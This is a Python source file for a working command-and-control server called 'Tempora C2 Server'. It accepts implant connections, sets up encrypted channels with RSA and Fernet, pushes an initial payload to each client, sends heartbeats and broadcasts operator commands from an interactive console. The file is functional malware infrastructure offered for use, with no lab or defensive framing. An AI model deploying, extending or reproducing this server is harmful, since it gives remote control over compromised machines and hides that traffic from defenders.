import socket
import threading
import time
import json
import logging
from queue import Queue
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes, hmac
from cryptography.hazmat.primitives.asymmetric import rsa, padding

from helpers.formatStrings import bcolors
class C2Server:
    def __init__(self, host='0.0.0.0', port=5000, initial_payload=None):
        self.host = host
        self.port = port
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        self.public_key = self.private_key.public_key()
        self.clients = {}
        self.client_lock = threading.Lock()
        self.task_queue = Queue()
        self.task_lock = threading.Lock()  # New lock for task operations
        self.initial_payload = initial_payload  # Store the initial payload
        
        logging.basicConfig(
            level=logging.DEBUG, 
            format=f'{bcolors.LIGHT_BLACK}%(asctime)s{bcolors.RESET} - {bcolors.LIGHT_CYAN}%(levelname)s:{bcolors.RESET} - {bcolors.LIGHT_GREEN}%(message)s{bcolors.RESET}',
            handlers=[
                logging.StreamHandler(),
                logging.FileHandler('../logs/c2_server.log')
            ]
        )
        self.logger = logging.getLogger('C2Server')

    def admin_interface(self):
        """Command line interface for sending commands"""
        prompt = f"{bcolors.style(bcolors.BOLD, bcolors.LIGHT_MAGENTA)}Tempora C2 Server > {bcolors.RESET}"
        
        # Command history
        command_history = []
        history_index = 0
        
        # Available commands and their descriptions
        commands = {
            "list": "Show all connected clients",
            "task": "Send task to clients (format: task <type>:<command>)",
            "help": "Show this help message",
            "clear": "Clear the screen",
            "exit": "Exit the server",
            "status": "Show server status",
            "target": "Select target client (format: target <client_id>)",
            "info": "Show detailed client information",
            "kill": "Disconnect a client (format: kill <client_id>)",
            "history": "Show command history"
        }
        
        # Current target client
        current_target = None
        
        def print_help():
            print(f"\n{bcolors.HEADER}Available Commands:{bcolors.RESET}")
            for cmd, desc in commands.items():
                print(f" {bcolors.LIGHT_CYAN}{cmd:<10}{bcolors.RESET} - {desc}")
            print()
        
        def print_status():
            with self.client_lock:
                total_clients = len(self.clients)
                active_clients = sum(1 for client in self.clients.values() 
                                  if time.time() - client['last_activity'] <= 60)
                print(f"\n{bcolors.HEADER}Server Status:{bcolors.RESET}")
                print(f" Total Clients: {bcolors.LIGHT_GREEN}{total_clients}{bcolors.RESET}")
                print(f" Active Clients: {bcolors.LIGHT_GREEN}{active_clients}{bcolors.RESET}")
                print(f" Current Target: {bcolors.LIGHT_CYAN}{current_target if current_target else 'None'}{bcolors.RESET}")
                print()
        
        def print_client_info(client_id):
            with self.client_lock:
                if client_id not in self.clients:
                    print(f"{bcolors.LIGHT_RED}Client {client_id} not found{bcolors.RESET}")
                    return
                
                client = self.clients[client_id]
                last_active = time.time() - client['last_activity']
                status = "Active" if last_active <= 60 else "Inactive"
                status_color = bcolors.LIGHT_GREEN if status == "Active" else bcolors.LIGHT_RED
                
                print(f"\n{bcolors.HEADER}Client Information:{bcolors.RESET}")
                print(f" ID: {bcolors.LIGHT_CYAN}{client_id}{bcolors.RESET}")
                print(f" Status: {status_color}{status}{bcolors.RESET}")
                print(f" Last Active: {bcolors.LIGHT_YELLOW}{last_active:.1f} seconds ago{bcolors.RESET}")
                print()
        
        while True:
            try:
                # Update prompt with current target
                if current_target:
                    current_prompt = f"{bcolors.style(bcolors.BOLD, bcolors.LIGHT_MAGENTA)}Tempora C2 Server [{current_target}] > {bcolors.RESET}"
                else:
                    current_prompt = prompt
                
                command = input(current_prompt).strip()
                
                # Handle empty command
                if not command:
                    continue
                
                # Add to history
                command_history.append(command)
                history_index = len(command_history)
                
                # Split command into parts
                parts = command.split()
                cmd = parts[0].lower()
                
                if cmd == "help":
                    print_help()
                
                elif cmd == "list":
                    with self.client_lock:
                        print(f"\n{bcolors.HEADER}Connected clients:{bcolors.RESET}")
                        for client_id, client_info in self.clients.items():
                            last_active = time.time() - client_info['last_activity']
                            status = "Active" if last_active <= 60 else "Inactive"
                            status_color = bcolors.LIGHT_GREEN if status == "Active" else bcolors.LIGHT_RED
                            
                            print(f" {bcolors.LIGHT_CYAN}-{bcolors.RESET} {bcolors.LIGHT_GREEN}{client_id}{bcolors.RESET} [{status_color}{status}{bcolors.RESET}]")
                    print()
                
                elif cmd == "task":
                    if len(parts) < 2:
                        print(f"{bcolors.LIGHT_RED}Invalid task format. Use: task <type>:<command>{bcolors.RESET}")
                        continue
                    
                    try:
                        task_type, *payload = parts[1].split(":", 1)
                        task = {
                            'type': task_type,
                            'cmd': payload[0] if payload else None,
                            'timestamp': time.time(),
                            'target': current_target  # Add target information
                        }
                        self.add_task(task)
                        print(f"{bcolors.LIGHT_GREEN}Task sent successfully{bcolors.RESET}")
                    except Exception as e:
                        self.logger.error(f"{bcolors.LIGHT_RED}Invalid task format: {e}{bcolors.RESET}")
                
                elif cmd == "clear":
                    print("\033[H\033[J")  # Clear screen
                
                elif cmd == "exit":
                    print(f"{bcolors.LIGHT_YELLOW}Shutting down server...{bcolors.RESET}")
                    break
                
                elif cmd == "status":
                    print_status()
                
                elif cmd == "target":
                    if len(parts) < 2:
                        print(f"{bcolors.LIGHT_RED}Please specify a client ID{bcolors.RESET}")
                        continue
                    
                    target_id = parts[1]
                    with self.client_lock:
                        if target_id in self.clients:
                            current_target = target_id
                            print(f"{bcolors.LIGHT_GREEN}Target set to: {target_id}{bcolors.RESET}")
                        else:
                            print(f"{bcolors.LIGHT_RED}Client {target_id} not found{bcolors.RESET}")
                
                elif cmd == "info":
                    if len(parts) < 2:
                        if current_target:
                            print_client_info(current_target)
                        else:
                            print(f"{bcolors.LIGHT_RED}No target selected. Use: info <client_id>{bcolors.RESET}")
                    else:
                        print_client_info(parts[1])
                
                elif cmd == "kill":
                    if len(parts) < 2:
                        print(f"{bcolors.LIGHT_RED}Please specify a client ID{bcolors.RESET}")
                        continue
                    
                    client_id = parts[1]
                    with self.client_lock:
                        if client_id in self.clients:
                            try:
                                self.clients[client_id]['socket'].close()
                            except:
                                pass
                            del self.clients[client_id]
                            print(f"{bcolors.LIGHT_GREEN}Client {client_id} disconnected{bcolors.RESET}")
                            if current_target == client_id:
                                current_target = None
                        else:
                            print(f"{bcolors.LIGHT_RED}Client {client_id} not found{bcolors.RESET}")
                
                elif cmd == "history":
                    print(f"\n{bcolors.HEADER}Command History:{bcolors.RESET}")
                    for i, cmd in enumerate(command_history[-10:], 1):  # Show last 10 commands
                        print(f" {bcolors.LIGHT_CYAN}{i}.{bcolors.RESET} {cmd}")
                    print()
                
                else:
                    print(f"{bcolors.LIGHT_RED}Unknown command: {cmd}{bcolors.RESET}")
                    print(f"Type {bcolors.LIGHT_CYAN}help{bcolors.RESET} for available commands")
                
            except KeyboardInterrupt:
                print(f"\n{bcolors.LIGHT_YELLOW}Shutting down admin interface{bcolors.RESET}")
                break
            except Exception as e:
                self.logger.error(f"Admin interface error: {e}")
    
    def get_public_key_pem(self):
        return self.public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
    
    def decrypt_asymmetric(self, encrypted_message):
        try:
            decrypted = self.private_key.decrypt(
                encrypted_message,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            return decrypted
        except Exception as e:
            self.logger.error(f"{bcolors.LIGHT_RED}Asymmetric Decryption Error: {e}{bcolors.RESET}")
            raise
    
    def start_server(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.host, self.port))
        server_socket.listen(5)
        
        self.logger.info(f"Server listening on {bcolors.LIGHT_YELLOW}{self.host}:{self.port}{bcolors.RESET}")
        
        threading.Thread(target=self.task_dispatcher, daemon=True).start()
        
        while True:
            try:
                client_socket, address = server_socket.accept()
                self.logger.info(f"Connection from {bcolors.LIGHT_CYAN}{address}{bcolors.RESET}")
                threading.Thread(
                    target=self.handle_client, 
                    args=(client_socket, address),
                    daemon=True
                ).start()
            except Exception as e:
                self.logger.error(f"{bcolors.LIGHT_RED}Server accept error: {e}{bcolors.RESET}")
    
    def handle_client(self, client_socket, address):
        try:
            client_socket.sendall(b'READY_FOR_KEY_EXCHANGE')
            client_socket.settimeout(120)
            
            ready_confirm = client_socket.recv(1024)
            if ready_confirm != b'CLIENT_READY':
                raise ValueError(f"{bcolors.LIGHT_RED}Client not ready for key exchange{bcolors.RESET}")
            
            client_socket.sendall(self.get_public_key_pem())
            
            symmetric_key_length = int(client_socket.recv(10).decode())
            hmac_key_length = int(client_socket.recv(10).decode())
            
            encrypted_symmetric_key = client_socket.recv(symmetric_key_length)
            encrypted_hmac_key = client_socket.recv(hmac_key_length)
            
            if not encrypted_symmetric_key or not encrypted_hmac_key:
                raise ValueError(f"{bcolors.LIGHT_RED}Incomplete key transmission from {address}{bcolors.RESET}")
            
            symmetric_key = self.decrypt_asymmetric(encrypted_symmetric_key)
            hmac_key = self.decrypt_asymmetric(encrypted_hmac_key)
            
            client_socket.sendall(b'KEY_EXCHANGE_COMPLETE')
            
            client_id = f"{address[0]}:{address[1]}"
            with self.client_lock:
                if client_id in self.clients:
                    # If client already exists, close the old connection
                    try:
                        old_socket = self.clients[client_id]['socket']
                        old_socket.close()
                    except:
                        pass
                
                self.clients[client_id] = {
                    'socket': client_socket,
                    'symmetric_key': symmetric_key,
                    'hmac_key': hmac_key,
                    'last_activity': time.time()
                }
            
            self.logger.info(f"Successful key exchange with {bcolors.LIGHT_CYAN}{address}{bcolors.RESET}")
            
            # Send initial payload if configured
            if self.initial_payload:
                try:
                    initial_task = {
                        'type': 'initial_payload',
                        'payload': self.initial_payload,
                        'timestamp': time.time()
                    }
                    self.add_task(initial_task)
                    self.logger.info(f"Initial payload sent to {bcolors.LIGHT_CYAN}{client_id}{bcolors.RESET}")
                except Exception as e:
                    self.logger.error(f"{bcolors.LIGHT_RED}Failed to send initial payload: {e}{bcolors.RESET}")
            
            self.handle_client_communication(client_id)
        
        except Exception as e:
            self.logger.error(f"{bcolors.LIGHT_RED}Client handling error with {address}: {e}{bcolors.RESET}")
        finally:
            try:
                client_socket.close()
            except:
                pass
    
    def handle_client_communication(self, client_id):
        try:
            with self.client_lock:
                client_info = self.clients.get(client_id)
                if not client_info:
                    return
                client_socket = client_info['socket']
                symmetric_key = client_info['symmetric_key']
                hmac_key = client_info['hmac_key']
            
            cipher = Fernet(symmetric_key)
            
            while True:
                try:
                    length_bytes = client_socket.recv(4)
                    if len(length_bytes) != 4:
                        break
                    data_length = int.from_bytes(length_bytes, byteorder='big')
                    
                    encrypted_data = b''
                    while len(encrypted_data) < data_length:
                        chunk = client_socket.recv(data_length - len(encrypted_data))
                        if not chunk:
                            break
                        encrypted_data += chunk
                    
                    if len(encrypted_data) != data_length:
                        break
                    
                    encrypted_hmac = client_socket.recv(32)
                    if len(encrypted_hmac) != 32:
                        break
                    
                    h = hmac.HMAC(hmac_key, hashes.SHA256())
                    h.update(encrypted_data)
                    try:
                        h.verify(encrypted_hmac)
                    except Exception:
                        continue
                    
                    decrypted_data = cipher.decrypt(encrypted_data).decode()
                    response = json.loads(decrypted_data)
                    self.logger.info(f"Received from {bcolors.LIGHT_CYAN}{client_id}: \n{bcolors.INFO}{response}{bcolors.RESET}")

                
                except Exception as e:
                    self.logger.error(f"{bcolors.LIGHT_RED}Error with {client_id}: {e}{bcolors.RESET}")
                    break
            
            with self.client_lock:
                if client_id in self.clients:
                    del self.clients[client_id]
            self.logger.info(f"{bcolors.LIGHT_RED}Client {client_id} disconnected{bcolors.RESET}")
        
        except Exception as e:
            self.logger.error(f"{bcolors.LIGHT_RED}Unexpected error with {client_id}: {e}{bcolors.RESET}")
        finally:
            try:
                client_socket.close()
            except:
                pass
    
    def task_dispatcher(self):
        last_heartbeat = 0
        while True:
            try:
                # Check if we need to send heartbeats
                current_time = time.time()
                if current_time - last_heartbeat > 15:  # Send heartbeat every 15 seconds
                    heartbeat_task = {
                        'type': 'heartbeat',
                        'timestamp': current_time
                    }
                    with self.client_lock:
                        clients_to_remove = []
                        for client_id, client_info in list(self.clients.items()):
                            try:
                                # Check if client is still active
                                if current_time - client_info['last_activity'] > 60:  # 60 seconds timeout
                                    clients_to_remove.append(client_id)
                                    continue

                                encrypted_task = Fernet(client_info['symmetric_key']).encrypt(
                                    json.dumps(heartbeat_task).encode()
                                )
                                h = hmac.HMAC(client_info['hmac_key'], hashes.SHA256())
                                h.update(encrypted_task)
                                task_hmac = h.finalize()
                                
                                data_length = len(encrypted_task).to_bytes(4, 'big')
                                client_info['socket'].sendall(data_length)
                                client_info['socket'].sendall(encrypted_task)
                                client_info['socket'].sendall(task_hmac)
                                
                                # Update last activity time
                                client_info['last_activity'] = current_time
                            except Exception as e:
                                self.logger.error(f"{bcolors.LIGHT_RED}Failed to send heartbeat to {client_id}: {e}{bcolors.RESET}")
                                clients_to_remove.append(client_id)
                        
                        # Remove inactive clients
                        for client_id in clients_to_remove:
                            if client_id in self.clients:
                                try:
                                    self.clients[client_id]['socket'].close()
                                except:
                                    pass
                                del self.clients[client_id]
                    
                    last_heartbeat = current_time

                # Process tasks from queue
                if not self.task_queue.empty():
                    with self.task_lock:
                        task = self.task_queue.get()
                    
                    with self.client_lock:
                        clients_to_remove = []
                        for client_id, client_info in list(self.clients.items()):
                            try:
                                # Check if client is still active
                                if current_time - client_info['last_activity'] > 60:  # 60 seconds timeout
                                    clients_to_remove.append(client_id)
                                    continue

                                encrypted_task = Fernet(client_info['symmetric_key']).encrypt(
                                    json.dumps(task).encode()
                                )
                                h = hmac.HMAC(client_info['hmac_key'], hashes.SHA256())
                                h.update(encrypted_task)
                                task_hmac = h.finalize()
                                
                                data_length = len(encrypted_task).to_bytes(4, 'big')
                                client_info['socket'].sendall(data_length)
                                client_info['socket'].sendall(encrypted_task)
                                client_info['socket'].sendall(task_hmac)
                                
                                # Update last activity time
                                client_info['last_activity'] = current_time
                            except Exception as e:
                                self.logger.error(f"{bcolors.LIGHT_RED}Failed to send task to {client_id}: {e}{bcolors.RESET}")
                                clients_to_remove.append(client_id)
                        
                        # Remove inactive clients
                        for client_id in clients_to_remove:
                            if client_id in self.clients:
                                try:
                                    self.clients[client_id]['socket'].close()
                                except:
                                    pass
                                del self.clients[client_id]
                
                time.sleep(1)
            except Exception as e:
                self.logger.error(f"{bcolors.LIGHT_RED}Task dispatcher error: {e}{bcolors.RESET}")
                time.sleep(5)
    
    def add_task(self, task):
        with self.task_lock:
            self.task_queue.put(task)
        self.logger.info(f"Task added: {task}")

def main():
    server = C2Server()
    # Start server in a separate thread
    server_thread = threading.Thread(target=server.start_server, daemon=True)
    server_thread.start()
    
    # Start admin interface in main thread
    server.admin_interface()

if __name__ == '__main__':
    main()